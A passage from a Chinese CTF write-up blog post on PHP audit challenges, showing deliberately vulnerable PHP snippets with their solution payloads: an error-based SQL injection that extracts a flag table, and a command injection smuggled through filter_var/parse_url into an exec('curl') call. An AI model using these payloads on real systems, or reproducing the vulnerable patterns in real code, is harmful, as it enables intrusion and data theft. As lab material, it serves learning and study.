class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">$conn = new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">	die(&quot;连接失败: &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT COUNT(*) FROM users&quot;;</span><br><span class="line">$whitelist = array();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">	$row = $result-&gt;fetch_assoc();</span><br><span class="line">	$whitelist = range(1, $row[&apos;COUNT(*)&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[&apos;id&apos;]);</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id=$id&quot;;</span><br><span class="line"></span><br><span class="line">if (!in_array($id, $whitelist)) &#123;</span><br><span class="line">	die(&quot;id $id is not in whitelist.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">	$row = $result-&gt;fetch_assoc();</span><br><span class="line">	echo &quot;&lt;center&gt;&lt;table border=&apos;1&apos;&gt;&quot;;</span><br><span class="line">	foreach ($row as $key =&gt; $value) &#123;</span><br><span class="line">		echo &quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &quot;&lt;/table&gt;&lt;/center&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	die($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,&apos;~&apos;,(select flag from flag)),1))</span><br></pre></td></tr></table></figure></p>
<p>参考:<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">https://xz.aliyun.com/t/2451</a><br><a href="https://xz.aliyun.com/t/2160" target="_blank" rel="noopener">https://xz.aliyun.com/t/2160</a><br><a href="https://xz.aliyun.com/t/2491" target="_blank" rel="noopener">https://xz.aliyun.com/t/2491</a></p>
<h1 id="filter-var缺陷"><a href="#filter-var缺陷" class="headerlink" title="filter_var缺陷"></a>filter_var缺陷</h1><p><a href="https://xz.aliyun.com/t/2457" target="_blank" rel="noopener">https://xz.aliyun.com/t/2457</a><br>PHP 5 &gt;= 5.2.0, PHP 7<br>红日的题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php </span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    if(preg_match(&apos;/sec-redclub.com$/&apos;,$site_info[&apos;host&apos;]))&#123;</span><br><span class="line">        exec(&apos;curl &quot;&apos;.$site_info[&apos;host&apos;].&apos;&quot;&apos;, $result);</span><br><span class="line">        echo &quot;&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info[&apos;host&apos;]&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">              &lt;center&gt;&lt;textarea rows=&apos;20&apos; cols=&apos;90&apos;&gt;&quot;;</span><br><span class="line">        echo implode(&apos; &apos;, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span><br><span class="line">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// f1agi3hEre.php</span><br><span class="line">&lt;?php  </span><br><span class="line">$flag = &quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>评论的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=test://&quot;|cat&lt;&gt;f1agi3hEre.php;&quot;sec-redclub.com</span><br></pre></td></tr></table></figure></p>
<p>官方wp:<a href="https://xz.aliyun.com/t/2491" target="_blank" rel="noopener">https://xz.aliyun.com/t/2491</a></p>
<h1 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h1><p>wp:<a href="https://xz.aliyun.com/t/2491" target="_blank" rel="noopener">https://xz.aliyun.com/t/2491</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;404&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class)&#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname = isset($_GET[&apos;name&apos;]) ? $_GET[&apos;name&apos;] : null;</span><br><span class="line">$param = isset($_GET[&apos;param&apos;]) ? $_GET[&apos;param&apos;] : null;</span><br><span class="line">$param2 = isset($_GET[&apos;param2&apos;]) ? $_GET[&apos;param2&apos;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">    $newclass = new $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key=&gt;$value)</span><br><span class="line">        echo $key.&apos;=&gt;&apos;.$value.&apos;&lt;br&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// f1agi3hEre.php</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者: n3k0
            
            <p>发表日期: <a href="https://kuraraneko.github.io/2018/01/28/php审计/">January 28th 2018, 7:06:23</a>
            <p>发出嘶吼: 没有魔夜2玩我要死了</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2018/02/09/RSA例题/" title= RSA例题 >
                    <div class="nextTitle">RSA例题</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2018/01/21/python微信跳一跳/" title= python微信跳一跳 >
                    <div class="prevTitle">python微信跳一跳</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

    <div id="lv-container" data-id="city" data-uid= MTAyMC8zNjQ3Ni8xMzAxMQ==>
        <script type="text/javascript">
            (function (d, s) {
                var j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') { return; }
                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
    </div>

<!-- City版安装代码已完成 -->
    
    
    <!--PC版-->

    <!--PC版-->


    
    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:3412260756@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    

    </div>
    
    
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
        el psy congroo
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#extract覆盖"><span class="toc-number">1.</span> <span class="toc-text"><a href="#extract&#x8986;&#x76D6;" class="headerlink" title="extract&#x8986;&#x76D6;"></a>extract&#x8986;&#x76D6;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#is-number-amp-回文数绕过"><span class="toc-number">2.</span> <span class="toc-text"><a href="#is-number-amp-&#x56DE;&#x6587;&#x6570;&#x7ED5;&#x8FC7;" class="headerlink" title="is_number&amp;&#x56DE;&#x6587;&#x6570;&#x7ED5;&#x8FC7;"></a>is_number&amp;&#x56DE;&#x6587;&#x6570;&#x7ED5;&#x8FC7;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#序列化"><span class="toc-number">3.</span> <span class="toc-text"><a href="#&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="&#x5E8F;&#x5217;&#x5316;"></a>&#x5E8F;&#x5217;&#x5316;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#with-rollup"><span class="toc-number">4.</span> <span class="toc-text"><a href="#with-rollup" class="headerlink" title="with rollup"></a>with rollup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ereg绕过及php弱语言性质"><span class="toc-number">5.</span> <span class="toc-text"><a href="#ereg&#x7ED5;&#x8FC7;&#x53CA;php&#x5F31;&#x8BED;&#x8A00;&#x6027;&#x8D28;" class="headerlink" title="ereg&#x7ED5;&#x8FC7;&#x53CA;php&#x5F31;&#x8BED;&#x8A00;&#x6027;&#x8D28;"></a>ereg&#x7ED5;&#x8FC7;&#x53CA;php&#x5F31;&#x8BED;&#x8A00;&#x6027;&#x8D28;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eregi-file-get-contents绕过"><span class="toc-number">6.</span> <span class="toc-text"><a href="#eregi-file-get-contents&#x7ED5;&#x8FC7;" class="headerlink" title="eregi,file_get_contents&#x7ED5;&#x8FC7;"></a>eregi,file_get_contents&#x7ED5;&#x8FC7;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#数组绕过strcmp"><span class="toc-number">7.</span> <span class="toc-text"><a href="#&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strcmp" class="headerlink" title="&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strcmp"></a>&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strcmp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#数组绕过sha1"><span class="toc-number">8.</span> <span class="toc-text"><a href="#&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;sha1" class="headerlink" title="&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;sha1"></a>&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;sha1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bp绕过session"><span class="toc-number">9.</span> <span class="toc-text"><a href="#bp&#x7ED5;&#x8FC7;session" class="headerlink" title="bp&#x7ED5;&#x8FC7;session"></a>bp&#x7ED5;&#x8FC7;session</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#这个属于sql注入了吧…"><span class="toc-number">10.</span> <span class="toc-text"><a href="#&#x8FD9;&#x4E2A;&#x5C5E;&#x4E8E;sql&#x6CE8;&#x5165;&#x4E86;&#x5427;&#x2026;" class="headerlink" title="&#x8FD9;&#x4E2A;&#x5C5E;&#x4E8E;sql&#x6CE8;&#x5165;&#x4E86;&#x5427;&#x2026;"></a>&#x8FD9;&#x4E2A;&#x5C5E;&#x4E8E;sql&#x6CE8;&#x5165;&#x4E86;&#x5427;&#x2026;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#url双重编码"><span class="toc-number">11.</span> <span class="toc-text"><a href="#url&#x53CC;&#x91CD;&#x7F16;&#x7801;" class="headerlink" title="url&#x53CC;&#x91CD;&#x7F16;&#x7801;"></a>url&#x53CC;&#x91CD;&#x7F16;&#x7801;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql闭合"><span class="toc-number">12.</span> <span class="toc-text"><a href="#sql&#x95ED;&#x5408;" class="headerlink" title="sql&#x95ED;&#x5408;"></a>sql&#x95ED;&#x5408;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#改xff"><span class="toc-number">13.</span> <span class="toc-text"><a href="#&#x6539;xff" class="headerlink" title="&#x6539;xff"></a>&#x6539;xff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5绕过"><span class="toc-number">14.</span> <span class="toc-text"><a href="#md5&#x7ED5;&#x8FC7;" class="headerlink" title="md5&#x7ED5;&#x8FC7;"></a>md5&#x7ED5;&#x8FC7;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#intval四舍五入"><span class="toc-number">15.</span> <span class="toc-text"><a href="#intval&#x56DB;&#x820D;&#x4E94;&#x5165;" class="headerlink" title="intval&#x56DB;&#x820D;&#x4E94;&#x5165;"></a>intval&#x56DB;&#x820D;&#x4E94;&#x5165;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#数组绕过strpos"><span class="toc-number">16.</span> <span class="toc-text"><a href="#&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strpos" class="headerlink" title="&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strpos"></a>&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;strpos</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#也是个sql注入"><span class="toc-number">17.</span> <span class="toc-text"><a href="#&#x4E5F;&#x662F;&#x4E2A;sql&#x6CE8;&#x5165;" class="headerlink" title="&#x4E5F;&#x662F;&#x4E2A;sql&#x6CE8;&#x5165;"></a>&#x4E5F;&#x662F;&#x4E2A;sql&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16进制绕过10进制检测"><span class="toc-number">18.</span> <span class="toc-text"><a href="#16&#x8FDB;&#x5236;&#x7ED5;&#x8FC7;10&#x8FDB;&#x5236;&#x68C0;&#x6D4B;" class="headerlink" title="16&#x8FDB;&#x5236;&#x7ED5;&#x8FC7;10&#x8FDB;&#x5236;&#x68C0;&#x6D4B;"></a>16&#x8FDB;&#x5236;&#x7ED5;&#x8FC7;10&#x8FDB;&#x5236;&#x68C0;&#x6D4B;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正则"><span class="toc-number">19.</span> <span class="toc-text"><a href="#&#x6B63;&#x5219;" class="headerlink" title="&#x6B63;&#x5219;"></a>&#x6B63;&#x5219;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#弱类型-amp-00截断绕过is-numeric"><span class="toc-number">20.</span> <span class="toc-text"><a href="#&#x5F31;&#x7C7B;&#x578B;-amp-00&#x622A;&#x65AD;&#x7ED5;&#x8FC7;is-numeric" class="headerlink" title="&#x5F31;&#x7C7B;&#x578B;&amp;00&#x622A;&#x65AD;&#x7ED5;&#x8FC7;is_numeric"></a>&#x5F31;&#x7C7B;&#x578B;&amp;00&#x622A;&#x65AD;&#x7ED5;&#x8FC7;is_numeric</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-true"><span class="toc-number">21.</span> <span class="toc-text"><a href="#md5-true" class="headerlink" title="md5(,true)"></a>md5(,true)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反序列化"><span class="toc-number">22.</span> <span class="toc-text"><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#闭合反引号"><span class="toc-number">23.</span> <span class="toc-text"><a href="#&#x95ED;&#x5408;&#x53CD;&#x5F15;&#x53F7;" class="headerlink" title="&#x95ED;&#x5408;&#x53CD;&#x5F15;&#x53F7;"></a>&#x95ED;&#x5408;&#x53CD;&#x5F15;&#x53F7;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用implode绕过正则"><span class="toc-number">24.</span> <span class="toc-text"><a href="#&#x5229;&#x7528;implode&#x7ED5;&#x8FC7;&#x6B63;&#x5219;" class="headerlink" title="&#x5229;&#x7528;implode&#x7ED5;&#x8FC7;&#x6B63;&#x5219;"></a>&#x5229;&#x7528;implode&#x7ED5;&#x8FC7;&#x6B63;&#x5219;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-filter读源码"><span class="toc-number">25.</span> <span class="toc-text"><a href="#php-filter&#x8BFB;&#x6E90;&#x7801;" class="headerlink" title="php://filter&#x8BFB;&#x6E90;&#x7801;"></a>php://filter&#x8BFB;&#x6E90;&#x7801;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用优先级绕过一些判断"><span class="toc-number">26.</span> <span class="toc-text"><a href="#&#x5229;&#x7528;&#x4F18;&#x5148;&#x7EA7;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;" class="headerlink" title="&#x5229;&#x7528;&#x4F18;&#x5148;&#x7EA7;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;"></a>&#x5229;&#x7528;&#x4F18;&#x5148;&#x7EA7;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#还是弱类型"><span class="toc-number">27.</span> <span class="toc-text"><a href="#&#x8FD8;&#x662F;&#x5F31;&#x7C7B;&#x578B;" class="headerlink" title="&#x8FD8;&#x662F;&#x5F31;&#x7C7B;&#x578B;"></a>&#x8FD8;&#x662F;&#x5F31;&#x7C7B;&#x578B;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#包含-序列化-php-input得到原始post数据，php-filter读源码"><span class="toc-number">28.</span> <span class="toc-text"><a href="#&#x5305;&#x542B;-&#x5E8F;&#x5217;&#x5316;-php-input&#x5F97;&#x5230;&#x539F;&#x59CB;post&#x6570;&#x636E;&#xFF0C;php-filter&#x8BFB;&#x6E90;&#x7801;" class="headerlink" title="&#x5305;&#x542B;,&#x5E8F;&#x5217;&#x5316;,php://input&#x5F97;&#x5230;&#x539F;&#x59CB;post&#x6570;&#x636E;&#xFF0C;php://filter&#x8BFB;&#x6E90;&#x7801;"></a>&#x5305;&#x542B;,&#x5E8F;&#x5217;&#x5316;,php://input&#x5F97;&#x5230;&#x539F;&#x59CB;post&#x6570;&#x636E;&#xFF0C;php://filter&#x8BFB;&#x6E90;&#x7801;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#执行命令"><span class="toc-number">29.</span> <span class="toc-text"><a href="#&#x6267;&#x884C;&#x547D;&#x4EE4;" class="headerlink" title="${}&#x6267;&#x884C;&#x547D;&#x4EE4;"></a>${}&#x6267;&#x884C;&#x547D;&#x4EE4;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gt-任何数-表示"><span class="toc-number">30.</span> <span class="toc-text"><a href="#gt-&#x4EFB;&#x4F55;&#x6570;-&#x8868;&#x793A;" class="headerlink" title="[]&gt;&#x4EFB;&#x4F55;&#x6570;,.&#x8868;&#x793A;_"></a>[]&gt;&#x4EFB;&#x4F55;&#x6570;,.&#x8868;&#x793A;_</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#in-array未设置第三个参数"><span class="toc-number">31.</span> <span class="toc-text"><a href="#in-array&#x672A;&#x8BBE;&#x7F6E;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;" class="headerlink" title="in_array&#x672A;&#x8BBE;&#x7F6E;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;"></a>in_array&#x672A;&#x8BBE;&#x7F6E;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#filter-var缺陷"><span class="toc-number">32.</span> <span class="toc-text"><a href="#filter-var&#x7F3A;&#x9677;" class="headerlink" title="filter_var&#x7F3A;&#x9677;"></a>filter_var&#x7F3A;&#x9677;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实例化任意对象漏洞"><span class="toc-number">33.</span> <span class="toc-text"><a href="#&#x5B9E;&#x4F8B;&#x5316;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x5B9E;&#x4F8B;&#x5316;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x6F0F;&#x6D1E;"></a>&#x5B9E;&#x4F8B;&#x5316;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x6F0F;&#x6D1E;</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-archive"> Total : 66 </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2018 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/Hitcon-Redo/" >Hitcon-Redo</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2018/10/18/ECC-learn/" >ECC-learn</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2018/10/13/护网杯wp/" >护网杯wp</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/11</span><a class="archive-post-title" href= "/2018/10/11/root-me-app-system/" >root-me-app-system</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2018/09/17/CSAW-CTF-2018-Writeup/" >CSAW CTF 2018 Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2018/09/10/Python-Sandbox-Excape/" >Python Sandbox Excape</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/noxCTF-2018-writeup/" >noxCTF-2018 writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2018/09/06/python-Debug命令执行/" >python Debug命令执行</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/xman2018/" >xman-2018</a>
        </li>
    
    
